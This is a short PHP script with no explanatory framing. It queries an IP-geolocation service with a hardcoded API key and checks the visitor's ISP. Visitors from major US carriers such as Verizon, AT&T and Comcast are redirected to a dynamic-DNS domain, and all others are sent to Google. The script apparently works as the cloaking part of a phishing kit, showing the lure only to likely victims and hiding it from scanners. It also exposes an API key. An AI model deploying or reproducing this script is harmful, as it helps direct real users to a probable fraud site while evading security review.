<?php 
 
// IP address 
$userIP = getenv('REMOTE_ADDR'); 
// API end URL 
$apiURL = 'https://api.ipgeolocation.io/ipgeo?apiKey=b29b8e616092467bbefc48f541d3213a&ip='.$userIP; 
 
// Create a new cURL resource with URL 
$ch = curl_init($apiURL); 
 
// Return response instead of outputting 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
 
// Execute API request 
$apiResponse = curl_exec($ch); 
 
// Close cURL resource 
curl_close($ch); 
 
// Retrieve IP data from API response 
$ipData = json_decode($apiResponse, true); 
 
if(!empty($ipData)){ 
    $isp = $ipData['isp']; 

    echo '-'; 
}else{ 
    echo '-'; 
} 

if ($isp == "T-Mobile USA, Inc.") {
	header ("Location: https://mtbvncx1.ddnss.eu");
}elseif ($isp == "Sprint") {
	header ("Location: https://mtbvncx1.ddnss.eu");
}elseif ($isp == "Verizon Business") {
	header ("Location: https://mtbvncx1.ddnss.eu");
}elseif ($isp == "Charter Communications Inc") {
	header ("Location: https://mtbvncx1.ddnss.eu");
}elseif ($isp == "AT&T Worldnet Services") {
	header ("Location: https://mtbvncx1.ddnss.eu");
}elseif ($isp == "AT&T Mobility LLC") {
	header ("Location: https://mtbvncx1.ddnss.eu");
}elseif ($isp == "Comcast") {
	header ("Location: https://mtbvncx1.ddnss.eu");
}elseif ($isp == "Wi-Fiber, Inc.") {
	header ("Location: https://mtbvncx1.ddnss.eu");
}elseif ($isp == "Cox Communications Inc.") {
	header ("Location: https://mtbvncx1.ddnss.eu");
} else {
  header ("Location: https://www.google.com");
}
 
?>
